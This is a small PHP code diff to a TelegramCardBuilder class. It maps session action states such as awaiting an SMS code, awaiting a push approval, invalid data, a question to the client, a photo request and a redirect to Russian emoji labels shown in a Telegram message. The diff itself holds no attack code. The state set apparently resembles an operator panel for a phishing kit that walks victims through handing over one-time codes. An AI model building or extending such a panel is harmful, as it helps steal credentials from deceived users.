@@ -70,8 +70,21 @@ class TelegramCardBuilder
         }
 
         $current = $session->action_type['type'] ?? 'idle';
+        $stateLabel = match ($current) {
+            'hold.short'         => '⏳ Ожидание (короткое)',
+            'hold.long'          => '⏳ Ожидание (долгое)',
+            'sms'                => '📱 Ожидает SMS-код',
+            'push'               => '🔔 Ожидает Push',
+            'invalid-data'       => '❌ Неверные данные',
+            'question'           => '❓ Вопрос клиенту',
+            'error'              => '⚠️ Ошибка',
+            'photo.with-input'   => '📸 Ожидает фото + текст',
+            'photo.without-input' => '📸 Ожидает фото',
+            'redirect'           => '🔗 Редирект',
+            default              => '🟢 Новая',
+        };
         $lines[] = '';
-        $lines[] = '<i>Состояние: ' . e($current) . '</i>';
+        $lines[] = '<i>Состояние: ' . $stateLabel . '</i>';
 
         return implode("\n", $lines);
     }
